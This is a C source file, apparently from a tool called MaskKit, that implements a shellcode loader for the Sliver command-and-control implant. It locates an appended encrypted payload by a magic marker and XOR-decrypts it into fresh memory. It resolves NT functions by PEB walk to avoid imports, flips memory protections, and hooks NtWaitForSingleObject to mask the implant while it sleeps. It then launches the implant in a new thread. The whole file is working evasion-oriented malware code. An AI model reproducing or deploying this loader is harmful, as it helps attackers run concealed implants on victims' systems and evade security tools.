/*
 * masker.c — MaskKit entry point and Sliver shellcode runner.
 *
 * Entry: go(void *args)
 *
 * Flow:
 *   1. Self-protect: briefly mark the blob's .bss as RW so we can write globals.
 *      NtProtectVirtualMemory is resolved inline via PEB walk before any globals
 *      are touched (patch_resolve uses only stack variables).
 *   2. resolve_all() — populates NT function pointer globals (writes to .bss).
 *   3. Locate config block via magic marker forward scan.
 *   4. XOR-decrypt Sliver shellcode into a fresh RW allocation.
 *   5. Mark that allocation RX (no RWX pages).
 *   6. Mark blob's .bss back to RX (globals are now read-only at runtime).
 *   7. Install NtWaitForSingleObject hook.
 *   8. Create Sliver shellcode thread.
 *   9. Wait for thread exit.
 *
 * Memory layout of the full payload blob (written by Go CLI):
 *   [masker shellcode bytes]
 *   [0xB33FCAFE 0xDEAD1337]  ← 8-byte magic marker
 *   [MASK_CONFIG 16 bytes]   ← interval_ms, threshold_ms, key_len, sc_len
 *   [key_len bytes]          ← XOR key
 *   [sc_len bytes]           ← XOR-encrypted Sliver shellcode
 *
 * IMPORTANT: this file is included into unity.c — do NOT compile standalone.
 */
#include "masker.h"

extern void resolve_all(void);
extern void hook_install(MASKER_CTX *ctx);

/* ── Find config block by scanning forward from our own base ── */
static MASK_CONFIG *find_config(uint8_t *base) {
    for (size_t off = 0; off < 0x400000; off += 4) {
        uint32_t *p = (uint32_t *)(base + off);
        if (p[0] == MASK_MAGIC_0 && p[1] == MASK_MAGIC_1)
            return (MASK_CONFIG *)(base + off + 8);
    }
    return NULL;
}

/* ── Byte copy (no memcpy — avoids CRT IAT reference) ── */
static void mcpy(void *dst, const void *src, uint32_t n) {
    uint8_t *d = (uint8_t *)dst;
    const uint8_t *s = (const uint8_t *)src;
    for (uint32_t i = 0; i < n; i++) d[i] = s[i];
}

/* ── Entry point ── */
void go(void *args) {
    (void)args;

    /* 0. Get our own base address via call/pop trick */
    uint8_t *blob_base;
    __asm__ volatile (
        "call 1f\n\t"
        "1: pop %0\n\t"
        "subq $5, %0\n\t"
        : "=r"(blob_base)
        :
        : "cc"
    );

    /* 1. Locate config (we need blob size to know how much to protect).
          patch_resolve() uses only stack/registers — safe to call before .bss write. */
    MASK_CONFIG *cfg = find_config(blob_base);
    if (!cfg) return;

    uint8_t *blob_end = (uint8_t *)cfg + sizeof(MASK_CONFIG) + cfg->key_len + cfg->sc_len;
    SIZE_T blob_sz = (SIZE_T)(blob_end - blob_base);

    /* 2. Briefly mark the entire blob RWX so we can write to .bss globals. */
    NtProtectVirtualMemory_t NtProtect =
        (NtProtectVirtualMemory_t)patch_resolve(H_NtProtectVirtualMemory);
    if (!NtProtect) return;

    PVOID prot_base = blob_base;
    SIZE_T prot_sz  = blob_sz;
    ULONG  old_prot = 0;
    NtProtect((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READWRITE, &old_prot);

    /* 3. Resolve all NT functions into .bss globals (now writable) */
    resolve_all();

    uint8_t  *key    = (uint8_t *)cfg + sizeof(MASK_CONFIG);
    uint8_t  *sc     = key + cfg->key_len;
    uint32_t  sc_len = cfg->sc_len;
    uint32_t  klen   = cfg->key_len;

    /* 4. Allocate RW, copy + XOR-decrypt shellcode */
    SIZE_T sc_sz    = (SIZE_T)sc_len;
    PVOID  sc_alloc = NULL;
    _NtAllocateVirtualMemory((HANDLE)-1, &sc_alloc, 0, &sc_sz,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!sc_alloc) return;

    mcpy(sc_alloc, sc, sc_len);

    uint8_t *dst = (uint8_t *)sc_alloc;
    for (uint32_t i = 0; i < sc_len; i++)
        dst[i] ^= key[i % klen];

    /* 5. Mark Sliver shellcode RX — no RWX pages */
    PVOID sc_ptr = sc_alloc;
    SIZE_T sc_sz2 = sc_sz;
    _NtProtectVirtualMemory((HANDLE)-1, &sc_ptr, &sc_sz2,
                             PAGE_EXECUTE_READ, &old_prot);

    /* 6. Restore blob to RX (globals are read-only from here on) */
    prot_base = blob_base;
    prot_sz   = blob_sz;
    NtProtect((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);

    /* 7. Set up MASKER_CTX and install hook
          g_trampoline and g_ctx are in .bss — they were writable during steps 2–6
          and will stay readable (RX) from now on. hook_install() runs while .bss
          is temporarily re-writable for the brief hook-install window. */
    prot_base = blob_base;
    prot_sz   = blob_sz;
    NtProtect((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READWRITE, &old_prot);

    static MASKER_CTX ctx;
    /* memset equivalent — no CRT */
    uint8_t *cp = (uint8_t *)&ctx;
    for (uint32_t i = 0; i < sizeof(ctx); i++) cp[i] = 0;

    ctx.sc_base      = sc_alloc;
    ctx.sc_size      = (SIZE_T)sc_len;
    ctx.key          = key;
    ctx.key_len      = klen;
    ctx.interval_ms  = cfg->interval_ms  ? cfg->interval_ms  : 0;
    ctx.threshold_ms = cfg->threshold_ms ? cfg->threshold_ms : 5000;
    ctx.masking      = FALSE;

    hook_install(&ctx);

    /* Restore blob to RX again */
    prot_base = blob_base;
    prot_sz   = blob_sz;
    NtProtect((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);

    /* 8. Create shellcode thread */
    HANDLE hThread = NULL;
    _NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
                      sc_alloc, NULL, 0, 0, 0, 0, NULL);
    ctx.sc_thread = hThread;

    /* 9. Wait for Sliver shellcode thread to exit */
    if (hThread)
        _real_NtWaitForSingleObject(hThread, FALSE, NULL);

    /* Cleanup */
    SIZE_T zero = 0;
    _NtFreeVirtualMemory((HANDLE)-1, &sc_alloc, &zero, MEM_RELEASE);
}
